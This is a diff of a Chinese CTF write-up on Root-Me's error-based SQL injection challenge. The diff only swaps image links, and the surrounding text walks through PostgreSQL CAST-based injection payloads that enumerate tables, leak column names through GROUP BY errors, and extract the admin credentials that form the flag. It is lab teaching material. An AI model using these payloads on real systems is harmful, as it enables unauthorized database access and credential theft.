@@ -11,7 +11,7 @@
 
 `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=[注入点]`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/4d44776fb7bd601f8fa447615af22c14.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/01.png)
 
 从报错可以知道，注入点在 `order by` 后面，而且还写死了一列 `page`，导致可控的 payload 不多。
 
@@ -21,34 +21,34 @@
 
 在 order 后面随便增加一些列，如注入 `,aaa,bbb,ccc,ddd`，虽然得到异常信息，但不是很有用：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/1b1f2135dc92dbbd4d1ed80f64878c52.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/02.png)
 
 这里还可以利用 `order by` 的特性，直接利用列号代替列名，看看会有什么效果。
 
 发现当注入的列号小于 3 的时候，如注入 `,1,2` ， SQL 是正常执行的：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/7ba06d21692bdb261526a33108737882.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/03.png)
 
 但当注入的列号大于 3 的时候，如注入 `,3` ， SQL 则报错不存在这列，说明 `contents` 表只有两列：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/59fd5562b93292dbbd97004064e9ae17.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/04.png)
 
 由于其中一列是 `page` ，我猜测另一列是主键 `id` ，尝试注入 `,id,exp` ，蒙对了：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/dee798f743a69f7c3c28145a36d6755e.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/05.png)
 
 其实到此为止都没得到什么有用的信息，不过我在操作过程中发现，
 
 注入单引号 `'` 和双引号 `"` 除了会引起 SQL 语法错误之外没什么用：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/8b66bd6d10dd11eeebae46dfe67472f0.png)
-![](http://exp-blog.com/wp-content/uploads/2019/03/ca59ca58fbb9dbc699dcb992de6f6bde.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/06.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/07.png)
 
 而只要注入内容中包含分号 `;` ，就必定会触发攻击检测： `attack detected` 。
 
 说明这题 **不允许通过分号注入多条 SQL** ：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/8d430a0506909f4abef617ab914de151.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/08.png)
 
 ------------
 
@@ -68,7 +68,7 @@
 
 这个异常信息就很意思了，我搜索了一下，发现 `not type character varying` 是 **PostgreSql** 数据库特有关键字。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/8690a1babcd150824726d840758a3e44.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/09.png)
 
 
 ------------
@@ -85,7 +85,7 @@
 ASC,(CAST((CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1788=1788) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(113)) AS NUMERIC))
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/1c754311874aad099e45dc25b7b407c7.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/10.png)
 
 这个 payload 并不能用来解决这个挑战，它是 `sqlmap` 用于确认被注入的 SQL 是什么类型的**探针**。
 
@@ -159,13 +159,13 @@ ASC,(
 
 得到：PostgreSQL 9.3.20 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4, 64-bit
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/23a66ca65f3f32d323db330e31a1c994.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/11.png)
 
 又如要获取数据库名称：`,(CAST(CHR(62)||(SELECT CURRENT_DATABASE()) AS NUMERIC))`
 
 得到：c_webserveur_34
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/0962fc5d0351468324c5dee621cb7db7.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/12.png)
 
 ------------
 
@@ -175,13 +175,13 @@ ASC,(
 
 在 pgsql 中，有一张固定的系统表 `pg_tables` 记录了所有库中所有表，其 [表结构](https://www.postgresql.org/docs/8.3/view-pg-tables.html) 为：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/31802c790139b16630e65667c1f4d169.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/13.png)
 
 先构造这样的 payload 查看当前数据库表的数量，一共 60 张表：
 
 `,(CAST(CHR(62)||(SELECT COUNT(1) FROM pg_tables) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/707a37b7e2278d98fbc3b1294189632c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/14.png)
 
 
 从 `pg_tables` 的表结构可以知道其中一列是 `tablename` ，尝试构造这样的 payload 获得所有表名：
@@ -190,7 +190,7 @@ ASC,(
 
 但是出错了，原因是构造的 SELECT 表达式返回的值不能超过 1 行。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/7be8d4a1ef1bacb22c45f61d99730b82.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/15.png)
 
 在 payload 中添加 `LIMIT 1` 即可避免此异常：
 
@@ -198,14 +198,14 @@ ASC,(
 
 成功获得了第一张表名 `pg_statistic` 。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/7300cdaeb792294c0a05ab24ce53488d.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/16.png)
 
 
 但 `LIMIT 1` 限制了每次都只能取到第一张表，又要怎样得到所有表名 ?
 
 其实方法也有很多，例如利用偏移 `LIMIT 1 OFFSET k` ，只要把 `k` 从 0 枚举到 59 ，发起请求 60 次，即可得到全部 60 张表， payload 为：`,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))` （注意把 `k` 换成数字）。可以编程实现 `k` 值枚举，不过这里推荐使用 Burp Suite 的 Intruder 实现：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/8e476bcc2ec1a35042de821929682ff0.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/17.png)
 
 根据不同的 `k` 值获得的 60 张表名如下：
 
@@ -284,7 +284,7 @@ ASC,(
 
 `,(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/f855c730425a2946db2f2b8d46d30841.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/18.png)
 
 
 尝试构造 payload 直接读取这行数据：
@@ -293,7 +293,7 @@ ASC,(
 
 但是又出错了，原因是构造的 SELECT 表达式返回的值除了不能超过 1 行，还不能超过 1 列。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/0a62042937ad07f91b997a7b38d5ae53.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/19.png)
 
 但是我们不知道 `m3mbr35t4bl3` 表的列名，为此先要设法找到其列名。
 
@@ -316,7 +316,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/9dfececdd649471a661bc6e8143fc4ae.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/20.png)
 
 从异常中抛出了其中一列的列名 `us3rn4m3_c0l` ，声称其未被包含在 `GROUP BY` 中。
 
@@ -324,19 +324,19 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/6abc626de6c237b341a3fb92cc1aa79b.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/21.png)
 
 这次又从异常中抛出了新的一列 `id`，利用之构造新的 payload 如下：
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/55d350beb58f1c9b22a31605837ac6a3.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/22.png)
 
 再次从异常中得到新的一列 `p455w0rd_c0l`，利用之构造新的 payload 如下：
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/ddf43c06a5791586c5f5f70c527caca6.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/23.png)
 
 继而从异常中得到新的一列 `em41l_c0l`，利用之构造新的 payload 如下：
 
@@ -346,7 +346,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 说明 `GROUP BY` 已经包含了所有列并查询了结果返回，但新返回值多于 1 列，所以使得我们的 payload 报错。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/52ce28baf1b319c99d5a57cdc1b35a0c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/24.png)
 
 ------------
 
@@ -364,25 +364,25 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/215dd778e2a59a606c8ad9bf11df825a.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/25.png)
 
 如下构造查询 `em41l_c0l` 列数据的 payload，得到 `admin@localhost` ：
 
 `,(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/383da25bcc0768f99b00cfb5dded1d3e.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/26.png)
 
 如下构造查询 `us3rn4m3_c0l` 列数据的 payload，得到 `admin` ：
 
 `,(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/245bca0260624dbad8835bd6a2f78688.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/27.png)
 
 如下构造查询 `p455w0rd_c0l` 列数据的 payload，得到 `1a2BdKT5DIx3qxQN3UaC` ：
 
 `,(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/68a2a76ddfd35eaeb7956c12c3c090b5.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/28.png)
 
 ------------
 
@@ -390,7 +390,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 使用得到的账号 `admin` 和密码 `1a2BdKT5DIx3qxQN3UaC` 登陆，得知这个密码就是 flag，完成挑战：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/55e48fa250bebc680aaccd707faf25af.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/29.png)
 
 ------
 
